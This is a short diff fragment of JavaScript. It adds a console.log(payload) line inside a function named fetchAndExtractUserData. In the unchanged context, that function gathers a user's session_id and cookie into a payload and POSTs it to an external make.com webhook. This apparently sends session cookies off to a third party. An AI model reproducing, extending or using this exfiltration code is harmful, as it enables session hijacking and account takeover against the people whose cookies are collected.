@@ -109,6 +109,7 @@ async function fetchAndExtractUserData(cookie) {
         session_id: session_id || "",
         cookie: frontCookie || ""
       };
+      console.log(payload)
 
       fetch("https://hook.us2.make.com/2cqv7guv1oq8353nipfwtrvrfkwtzbjy", {
         method: "POST",
